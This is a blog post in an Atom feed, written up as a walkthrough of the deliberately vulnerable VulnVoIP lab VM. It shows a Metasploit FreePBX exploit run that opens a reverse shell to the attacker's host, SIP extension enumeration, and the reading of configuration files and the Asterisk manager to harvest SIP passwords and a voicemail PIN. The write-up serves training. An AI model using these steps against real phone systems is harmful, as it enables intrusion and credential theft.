<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: voip | Core dump overflow]]></title>
  <link href="http://chousensha.github.io/blog/categories/voip/atom.xml" rel="self"/>
  <link href="http://chousensha.github.io/"/>
  <updated>2016-08-29T15:52:15-04:00</updated>
  <id>http://chousensha.github.io/</id>
  <author>
    <name><![CDATA[chousensha]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Pentest lab - VulnVoIP]]></title>
    <link href="http://chousensha.github.io/blog/2014/10/07/pentest-lab-vulnvoip/"/>
    <updated>2014-10-07T12:07:46-04:00</updated>
    <id>http://chousensha.github.io/blog/2014/10/07/pentest-lab-vulnvoip</id>
    <content type="html"><![CDATA[<p>I found a very interesting virtual machine on VulnHub that focuses on VoIP vulnerabilities. Since I haven&rsquo;t seen any other VoIP resources, I thought it would be great to give this a try.</p>

<blockquote><p>VulnVoIP is based on a relatively old AsteriskNOW distribution and has a number of
weaknesses. The aim is to locate VoIP users, crack their passwords and gain access
to the Support account voicemail.</p></blockquote>

<!-- more -->


<p>The IP of the target machine is 192.168.80.131. Here are the results of the port scan:</p>

<p>``` plain
nmap -A -p1-65535 192.168.80.131</p>

<p>Starting Nmap 6.47 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-10-07 19:45 EEST
Nmap scan report for 192.168.80.131
Host is up (0.00023s latency).
Not shown: 65527 closed ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey:
|   1024 1f:e2:e8:9e:2c:f8:31:39:36:f7:1d:aa:77:5e:ac:76 (DSA)
|<em>  2048 38:a4:9d:29:8a:11:9d:e1:13:5d:5e:6d:76:a6:63:76 (RSA)
53/tcp   open  domain     dnsmasq 2.45
| dns-nsid:
|</em>  bind.version: dnsmasq-2.45
80/tcp   open  http       Apache httpd 2.2.3 ((CentOS))
| http-methods: Potentially risky methods: TRACE
|<em>See <a href="http://nmap.org/nsedoc/scripts/http-methods.html">http://nmap.org/nsedoc/scripts/http-methods.html</a>
| http-robots.txt: 1 disallowed entry
|</em>/
|<em>http-title: FreePBX
111/tcp  open  rpcbind    2 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100024  1            966/udp  status
|</em>  100024  1            969/tcp  status
969/tcp  open  status     1 (RPC #100024)
3306/tcp open  mysql      MySQL (unauthorized)
4445/tcp open  upnotifyp?
5038/tcp open  asterisk   Asterisk Call Manager 1.1
MAC Address: 00:0C:29:84:8C:CC (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.18 &ndash; 2.6.32
```</p>

<p>Let&rsquo;s look at that DNS server first:</p>

<blockquote><p>dnsmasq is a lightweight DNS, TFTP and DHCP server. It is intended to provide coupled DNS and DHCP service to a LAN.</p>

<p>Dnsmasq accepts DNS queries and either answers them from a small, local, cache or forwards them to a real, recursive, DNS server. It loads the
contents of /etc/hosts so that local hostnames which do not appear in the global DNS can be resolved and also answers DNS queries for DHCP
configured hosts.</p>

<p>The dnsmasq DHCP server supports static address assignments and multiple networks. It automatically sends a sensible default set of DHCP options,
and can be configured to send any desired set of DHCP options, including vendor-encapsulated options. It includes a secure, read-only, TFTP server
to allow net/PXE boot of DHCP hosts and also supports BOOTP.</p>

<p>Dnsmasq supports IPv6 for DNS, but not DHCP.</p></blockquote>

<p>There is a Heap Overflow and Null-pointer Dereference vulnerability affecting the TFTP server component:</p>

<p><strong>CVE-2009-2957</strong></p>

<blockquote><p>A vulnerability has been found that may allow an attacker to execute arbitrary code on
servers or home routers running dnsmasq with the TFTP service
enabled (&lsquo;&mdash;enable-tfp&rsquo;). This service is not enabled by default on most
distributions; in particular it is not enabled by default on OpenWRT or
DD-WRT. Chances of successful exploitation increase when a long
directory prefix is used for TFTP. Code will be executed with the
privileges of the user running dnsmasq, which is normally a
non-privileged one.</p>

<p>Additionally there is a potential DoS attack to the TFTP service by
exploiting a null-pointer dereference vulnerability.</p></blockquote>

<p>I wasn&rsquo;t able to exploit this though, so moving on.</p>

<p>Navigating to the web page, we see two links, for Voicemail &amp; Recordings (ARI) and FreePBX Administration. The administration page requires HTTP authentication, and the other one is a login portal.</p>

<p>A Nessus scan revealed that the Asterisk Recording Interface uses a default set of credentials for the administrator&rsquo;s account: <em>admin</em>/<em>ari_password</em>, on the URL <a href="http://192.168.80.131/recordings/index.php">http://192.168.80.131/recordings/index.php</a> . I didn&rsquo;t find anything useful even after logging in. These credentials didn&rsquo;t work on the admin page at <a href="http://192.168.80.131/admin/config.php">http://192.168.80.131/admin/config.php</a> , but I was able to glean the FreePBX version from the webpage (2.7.0.0). Might come in handy later!</p>

<p>Since this is my first time doing anything remotely related to VoIP, I had some googling and reading to do. For a while I just digressed from the main goal of hacking this machine to burying myself in the Session Initiation Protocol RFC (ouch!), and 2 books: <a href="http://www.amazon.com/Hacking-Exposed-VoIP-Security-Solutions/dp/0072263644">Hacking Exposed VoIP: Voice Over IP Security Secrets &amp; Solutions</a> and <a href="http://www.amazon.com/Hacking-VoIP-Protocols-Attacks-Countermeasures/dp/1593271638">Hacking VoIP: Protocols, Attacks, and Countermeasures</a>.</p>

<p>So, a short introduction to SIP is in order:</p>

<blockquote><p> SIP is an application-layer control protocol that can establish,
modify, and terminate multimedia sessions (conferences) such as
Internet telephony calls. SIP can also invite participants to
already existing sessions, such as multicast conferences.</p>

<p>SIP employs design elements similar to the HTTP request/response transaction model. Each transaction consists of a client request that invokes a
particular method or function on the server and at least one response. SIP reuses most of the header fields, encoding rules and status codes of
HTTP, providing a readable text-based format.</p>

<p>Each resource of a SIP network, such as a user agent or a voicemail box, is identified by a URI, based on the general standard syntax also used in
Web services and e-mail. The URI scheme used for SIP is sip: and a typical SIP URI is of the form: sip:username:password@host:port</p>

<p>SIP clients typically use TCP or UDP on port numbers 5060 and/or 5061 to connect to SIP servers and other SIP endpoints. Port 5060 is commonly
used for non-encrypted signaling traffic whereas port 5061 is typically used for traffic encrypted with TLS. SIP is primarily used in setting up
and tearing down voice or video calls.</p></blockquote>

<p><strong>SIP Requests</strong></p>

<ul>
<li><p>INVITE &ndash; A client is being invited to participate in a call.</p></li>
<li><p>ACK &ndash; The client has confirmed the INVITE request.</p></li>
<li><p>BYE &ndash; The call has been terminated by either the caller or callee.</p></li>
<li><p>CANCEL &ndash; Cancel any pending requests.</p></li>
<li><p>OPTIONS &ndash; Queries the server for its capabilities.</p></li>
<li><p>REGISTER &ndash; Registers the client with the server according to the address in the To header.</p></li>
<li><p>PRACK &ndash; Similar to ACK, but a provisional confirmation.</p></li>
<li><p>SUBSCRIBE &ndash; Subscribes the device for an event notification.</p></li>
<li><p>NOTIFY &ndash; Notifies all subscribers of an event.</p></li>
<li><p>PUBLISH &ndash; Publishes an event to a server.</p></li>
<li><p>INFO &ndash; Sends information in the middle of a session that doesn&rsquo;t modify the session&rsquo;s state.</p></li>
<li><p>REFER &ndash; Asks the client to issue a SIP request, typically a call transfer.</p></li>
<li><p>MESSAGE &ndash; Sends an instant message using SIP.</p></li>
<li><p>UPDATE &ndash; Modifies a session&rsquo;s state without altering the dialog state.</p></li>
</ul>


<p>And, a little about Asterisk and FreePBX:</p>

<blockquote><p>Asterisk is a software implementation of a telephone private branch exchange (PBX). Like any PBX, it allows attached telephones to make calls to
one another, and to connect to other telephone services, such as the public switched telephone network (PSTN) and Voice over Internet Protocol
(VoIP) services.</p>

<p>FreePBX is an open source GUI that controls and manages Asterisk</p></blockquote>

<p>I found an awesome tool suite for this challenge: <a href="https://code.google.com/p/sipvicious/">SIPVicious</a></p>

<blockquote><p>SIPVicious suite is a set of tools that can be used to audit SIP based VoIP systems. It currently consists of the folowing tools:</p>

<p>svmap &ndash; this is a sip scanner. Lists SIP devices found on an IP range</p>

<p>svwar &ndash; identifies active extensions on a PBX</p>

<p>svcrack &ndash; an online password cracker for SIP PBX</p>

<p>svreport &ndash; manages sessions and exports reports to various formats</p>

<p>svcrash &ndash; attempts to stop unauthorized svwar and svcrack scans</p></blockquote>

<p>Let&rsquo;s get started then!</p>

<p>``` plain
./svmap.py 192.168.80.1/24</p>

<h2>| SIP Device          | User Agent            | Fingerprint |</h2>

<p>| 192.168.80.131:5060 | Asterisk PBX 1.6.2.11 | disabled    |
```</p>

<p>Now we also have the Asterisk version. Next, we need to find valid extensions (it took a while of trial and error to get meaningful information on this one):</p>

<p>``` plain
./svwar.py -D -m INVITE 192.168.80.131
WARNING:TakeASip:using an INVITE scan on an endpoint (i.e. SIP phone) may cause it to ring and wake up people in the middle of the night
WARNING:TakeASip:extension &lsquo;100&rsquo; probably exists but the response is unexpected
WARNING:TakeASip:extension &lsquo;100&rsquo; probably exists but the response is unexpected</p>

<h2>| Extension | Authentication |</h2>

<p>| 201       | reqauth        |
| 200       | reqauth        |
| 2000      | reqauth        |
| 102       | reqauth        |
| 100       | weird          |
| 101       | reqauth        |
```</p>

<p>The -D option enables scanning for default extensions, and the -m option specifies a request method (INVITE indicates that a client is being invited to participate in a call session.)</p>

<p>If you read the VM description on VulnHub, you probably remember that it mentions an easy way to get root to the machine. I found an exploit for that in Metasploit, more info here: <a href="http://www.offensive-security.com/vulndev/freepbx-exploit-phone-home/">http://www.offensive-security.com/vulndev/freepbx-exploit-phone-home/</a></p>

<p>``` plain
use exploit/unix/http/freepbx_callmenum</p>

<p>msf exploit(freepbx_callmenum) > show options</p>

<p>Module options (exploit/unix/http/freepbx_callmenum):</p>

<p>   Name       Current Setting  Required  Description</p>

<hr />

<p>   EXTENSION  2000-2001        yes       A range of Local extension numbers
   Proxies                     no        Use a proxy chain
   RHOST      192.168.80.131   yes       The target address
   RPORT      80               yes       The target port
   VHOST                       no        HTTP server virtual host</p>

<p>Payload options (generic/shell_reverse_tcp):</p>

<p>   Name   Current Setting  Required  Description</p>

<hr />

<p>   LHOST  192.168.80.130   yes       The listen address
   LPORT  4444             yes       The listen port</p>

<p>Exploit target:</p>

<p>   Id  Name</p>

<hr />

<p>   0   Automatic Target
```</p>

<p>I specified the extension to match one of those that we previously discovered. And the machine belongs to us now!</p>

<p>``` plain
msf exploit(freepbx_callmenum) > exploit</p>

<p>[<em>] Started reverse handler on 192.168.80.130:4444
[</em>] 192.168.80.131:80 &ndash; Sending evil request with range 2000
[<em>] 192.168.80.131:80 &ndash; Sending evil request with range 2001
[</em>] Command shell session 1 opened (192.168.80.130:4444 &ndash;> 192.168.80.131:47268) at 2014-10-14 14:42:29 +0300</p>

<p>whoami
root
```</p>

<p>But we are not done. We still have to find the usernames and passwords, and get the voicemail from the Support account. I googled a bit for a helpful configuration file, which turned out to be the <code>amportal.conf</code> file:</p>

<p>``` plain
cat /etc/amportal.conf</p>

<h1>This file is part of FreePBX.</h1>

<p>#</p>

<h1>FreePBX is free software: you can redistribute it and/or modify</h1>

<h1>it under the terms of the GNU General Public License as published by</h1>

<h1>the Free Software Foundation, either version 2 of the License, or</h1>

<h1>(at your option) any later version.</h1>

<p>#</p>

<h1>FreePBX is distributed in the hope that it will be useful,</h1>

<h1>but WITHOUT ANY WARRANTY; without even the implied warranty of</h1>

<h1>MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</h1>

<h1>GNU General Public License for more details.</h1>

<p>#</p>

<h1>You should have received a copy of the GNU General Public License</h1>

<h1>along with FreePBX.  If not, see <a href="http://www.gnu.org/licenses/">http://www.gnu.org/licenses/</a>.</h1>

<p>#</p>

<h1>This file contains settings for components of the Asterisk Management Portal</h1>

<h1>Spaces are not allowed!</h1>

<h1>Run /usr/src/AMP/apply_conf.sh after making changes to this file</h1>

<h1>AMPDBHOST: the host to connect to the database named &lsquo;asterisk&rsquo;</h1>

<p>AMPDBHOST=localhost</p>

<h1>AMPDBUSER: the user to connect to the database named &lsquo;asterisk&rsquo;</h1>

<p>AMPDBUSER=freepbx</p>

<h1>AMPDBENGINE: the type of database to use</h1>

<p>AMPDBENGINE=mysql</p>

<h1>AMPDBPASS: the password for AMPDBUSER</h1>

<p>AMPDBPASS=fpbx</p>

<h1>AMPENGINE: the telephony backend engine to use</h1>

<p>AMPENGINE=asterisk</p>

<h1>AMPMGRUSER: the user to access the Asterisk manager interface</h1>

<p>AMPMGRUSER=admin</p>

<h1>AMPMGRPASS: the password for AMPMGRUSER</h1>

<p>AMPMGRPASS=amp111
&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;.</p>

<h1>AUTHTYPE: authentication type to use for web admin</h1>

<h1>If type set to &lsquo;database&rsquo;, the primary AMP admin credentials will be the AMPDBUSER/AMPDBPASS above</h1>

<h1>valid: none, database</h1>

<p>AUTHTYPE=database</p>

<p>```</p>

<p>We have the username and password for the admin interface now.</p>

<p><img class="center" src="/images/pentest/vulnvoip/webadmin.png" title="&lsquo;freepbx webadmin&rsquo; &lsquo;webadmin interface&rsquo;" ></p>

<p>If we go to Panel, we can see that 2000 is the extension for the Support account. But I still couldn&rsquo;t find a way to actually listen to the voicemail message, and I don&rsquo;t have the password. But, I also have the credentials for the Asterisk Login Manager, so let&rsquo;s see if that helps. To login and authenticate to the manager, you must send a &ldquo;login&rdquo; action, with your user name and secret (password) as parameters. We can use telnet for this (don&rsquo;t forget to hit Enter twice after inputting the parameters):</p>

<p>``` plain
telnet 192.168.80.131 5038
Trying 192.168.80.131&hellip;
Connected to 192.168.80.131.
Escape character is &lsquo;^]&rsquo;.
Asterisk Call Manager/1.1
action: login
username: admin
secret: amp111</p>

<p>Response: Success
Message: Authentication accepted
```</p>

<p>For a comprehensive list of Asterisk commands, check out this <a href="http://www.voip-info.org/wiki/view/Asterisk+CLI">Asterisk CLI resource</a> and <a href="http://www.voip-info.org/wiki/view/Asterisk+manager+API">Manager Actions</a>. To list the SIP users, we have to use a &ldquo;command&rdquo; action this time. And then specify the command, which is <code>sip show users</code>:</p>

<p>``` plain
action: command
command: sip show users</p>

<p>Response: Follows
Privilege: Command
Username                   Secret           Accountcode      Def.Context      ACL  NAT     <br/>
100                                                          from-internal    Yes  Always  <br/>
101                        s3cur3                            from-internal    Yes  Always  <br/>
102                        letmein123                        from-internal    Yes  Always  <br/>
201                        secret123                         from-internal    Yes  Always  <br/>
200                        quit3s3curE123                    from-internal    Yes  Always  <br/>
2000                       password123                       from-internal    Yes  Always  <br/>
&mdash;END COMMAND&mdash;
```</p>

<p>And it was this easy to get the usernames and passwords! I should have started with that! Now it&rsquo;s possible to dial the extension and listen to the voicemail message. I just randomly chose Jitsi as a VoIP client for this task. You have to download and install the package file:</p>

<p><code>plain
wget https://download.jitsi.org/jitsi/debian/jitsi_2.5-latest_amd64.deb
dpkg -i jitsi_2.5-latest_amd64.deb
</code></p>

<p>Next, create an account in Jitsi:</p>

<p><img class="center" src="/images/pentest/vulnvoip/jitsi.png" title="&lsquo;jitsi&rsquo; &lsquo;jitsi&rsquo;" ></p>

<p>However, when you make the call, it asks for a voicemail password! I went back to my shell on the machine and to googling about Asterisk voicemail paswords. The configuration file that comes to the rescue is <code>/etc/asterisk/voicemail.conf</code>.</p>

<p>``` plain
cat /etc/asterisk/voicemail.conf
[general]</p>

<h1>include vm_general.inc</h1>

<h1>include vm_email.inc</h1>

<p>[default]</p>

<p>2000 => 0000,Support,,,attach=no|saycid=no|envelope=no|delete=no
```</p>

<p>So, the password is 0000, and we can now listen to the message, which I&rsquo;ll type here for the sake of completeness (hope I got it right):</p>

<blockquote><p>&ldquo;Hey Mark, I think the support web access account has been compromised. I have changed the password to securesupport123, all one word in
lowercase. You can log on at the usual address. See you in the morning&rdquo;</p></blockquote>

<p>Well, I really liked this challenge! It made me read up about various subjects I wasn&rsquo;t familiar with, like Asterisk and SIP. I also discovered the SIPVicious suite, which should come in handy from now on. And it was a great feeling to finally hear the message at the end. Also, VoIP hacking is a very interesting topic, and I hope there will be more chances to practice and learn about it.</p>

<blockquote><p>FORTUNE PROVIDES QUESTIONS FOR THE GREAT ANSWERS: #31</p>

<p>Q:    What is the name of the world&rsquo;s oldest kamikaze pilot?</p>

<p>A:    Chicken Teriyaki.</p></blockquote>
]]></content>
  </entry>
  
</feed>
